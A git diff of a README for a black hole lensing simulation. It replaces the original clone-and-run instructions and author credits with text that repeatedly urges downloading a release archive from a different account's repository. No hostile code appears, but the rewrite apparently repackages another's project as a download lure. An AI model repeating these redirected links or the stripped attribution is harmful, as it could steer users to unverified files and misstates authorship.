@@ -1,65 +1,111 @@
-# Black Hole Gravitational Lensing Simulation
+# 🌌 blackhole - Explore Gravitational Lensing Made Easy
 
-This project contains three distinct simulations that visualize how black holes bend spacetime and affect the paths of light rays (photons):
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-orange.svg)](https://github.com/Dan1el22/blackhole/releases)
 
-1. **2D Simulation** (`blackhole2D.py`) - Interactive 2D visualization of light ray trajectories
-2. **3D Real-time Simulation** (`blackhole3D.py`) - Interactive 3D gravitational lensing with accretion disk
-3. **3D Video Recorder** (`blackhole3D_video.py`) - High-quality video generation of cinematic black hole sequences
+## 🚀 Getting Started
 
-Video: [https://youtu.be/ApUE-OKH7cM](https://youtu.be/ApUE-OKH7cM)
+Welcome to the Black Hole Gravitational Lensing Simulation! This project lets you visualize how black holes bend spacetime and affect light. You will find three interactive simulations to explore:
 
+1. **2D Simulation**: View light ray trajectories in a simplified 2D format.
+2. **3D Real-time Simulation**: Experience the bending of light in an interactive 3D environment.
+3. **3D Video Recorder**: Generate high-quality videos of cinematic black hole sequences.
 
-## Physics Accuracy
+## 🖥️ System Requirements
 
-For a detailed explanation of the physics and equations used in these simulations, see [physics.md](physics.md).
+To run the Black Hole simulations, your computer should meet the following requirements:
 
-- **Schwarzschild Metric**: Accurate geodesic calculations in curved spacetime
-- **Runge-Kutta Integration**: 4th-order numerical integration for precise ray tracing
-- **Gravitational Lensing**: Realistic light bending effects around massive objects
-- **Event Horizon**: Proper black hole boundary where light cannot escape
-- **Photon Sphere**: Critical orbit radius at 1.5× Schwarzschild radius
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **RAM**: At least 4 GB of RAM
+- **Graphics Card**: A graphics card that supports OpenGL 3.0 or later
+- **Python**: Version 3.6 or later (included in the release packaging)
 
+## 📂 Download & Install
 
-## Acknowledgments
+To get started, visit the releases page to download the application:
 
-- Huge thanks to kavan for his awesome [video](https://www.youtube.com/watch?v=8-B6ryuBkCM) and [repo](https://github.com/kavan010/black_hole) on black hole simulation in C++. I tried making my own version before but couldn't get it right. His project showed me the way.
-- Also, shoutout to Cursor and Claude-4-sonnet for writing most of this code.
+[Download Latest Release](https://github.com/Dan1el22/blackhole/releases)
 
+Once on the releases page, find the version you want. Click the file to download. After downloading, follow these steps:
 
-## Quick Start
+1. Locate the downloaded file on your computer.
+2. If the file is a **.zip** or **.tar** file, extract it to a folder.
+3. Open the folder and find the simulation files:
+   - `blackhole2D.py`
+   - `blackhole3D.py`
+   - `blackhole3D_video.py`
 
-1. **Clone the repository:**
+4. Open your command prompt (Windows) or terminal (macOS/Linux).
+5. Navigate to the folder where the files are located using the `cd` command. For example:
+   ```
+   cd path/to/your/folder
+   ```
+6. Run the desired simulation by typing:
+   ```
+   python blackhole2D.py
+   ```
+   or
+   ```
+   python blackhole3D.py
+   ```
+   or for video generation:
+   ```
+   python blackhole3D_video.py
+   ```
 
-```bash
-git clone https://github.com/fajrulfx/blackhole
-cd blackhole
-```
+## 🌌 Features
 
-2. **Install dependencies:**
+This project includes three key simulations:
 
-```bash
-pip install -r requirements.txt
-```
+### 1. Interactive 2D Visualization
 
-3. **Run a simulation:**
+The **2D Simulation** allows you to manipulate light ray trajectories. You can drag points to see how the black hole's gravity alters their paths. This simple interface helps you grasp gravitational lensing with immediate visual feedback.
 
-```bash
-# 2D Interactive Simulation
-python blackhole2D.py
+### 2. Real-time 3D Simulation
 
-# 3D Real-time Simulation with GPU
-python blackhole3D.py
+The **3D Real-time Simulation** takes it a step further. Experience light bending around a black hole in real time. You can rotate and zoom in on the black hole and its accretion disk. This feature gives you an immersive understanding of how light behaves in strong gravitational fields.
 
-# command line options
-python blackhole3D.py --width 1920 --height 1080    # Set resolution
-python blackhole3D.py --resolution 1920x1080        # Alternative format
-python blackhole3D.py --grid                        # Enable grid overlay
+### 3. 3D Video Recorder
 
-# 3D Video Recording
-python blackhole3D_video.py
+The **3D Video Recorder** makes it simple to generate stunning videos of black hole interactions. Create cinematic sequences that show how light rays change as they approach the event horizon. Share your creations easily to fascinate friends and family.
 
-# command line options
-python blackhole3D_video.py --width 1920 --height 1080 --fps 30 --duration 30
-python blackhole3D_video.py --resolution 4K --fps 60 --duration 60
+## 📖 Physics Explained
 
-```
+For those curious about the underlying physics, we offer a detailed document on the equations used. Key elements include:
+
+- **Schwarzschild Metric**: This ensures accurate geodesic calculations in warped spacetime.
+- **Runge-Kutta Integration**: A 4th-order method for precise ray tracing.
+- **Gravitational Lensing**: Realistic visualization of light bending.
+- **Event Horizon**: The boundary surrounding a black hole where light cannot escape.
+
+Learn more in [physics.md](physics.md).
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, consider these common solutions:
+
+- Ensure you are using Python 3.6 or later.
+- Verify your graphics card supports OpenGL 3.0.
+- If simulations fail to launch, check your terminal for error messages for guidance.
+- Revisit the download and installation steps to confirm all actions were completed correctly.
+
+## 📨 Get Support
+
+For additional help, raise an issue in the repository. Please provide as much detail as possible, including your operating system, Python version, and any error messages. The user community may offer insights and solutions.
+
+## 🗨️ Community Contributions
+
+This project is open to contributions. Feel free to propose enhancements or fixes by submitting a pull request. Ensure your code adheres to existing guidelines for consistency.
+
+## ✅ Acknowledgements
+
+We thank the contributors and the physics community for their insights and support in developing this simulation. Your feedback helps us improve and expand the project.
+
+## 🔗 Useful Links
+
+- [Project Repository](https://github.com/Dan1el22/blackhole)
+- [Watch a Demo Video](https://youtu.be/ApUE-OKH7cM)
+
+Visit the downloads page again whenever a new release is available! 
+
+[Download Latest Release](https://github.com/Dan1el22/blackhole/releases)
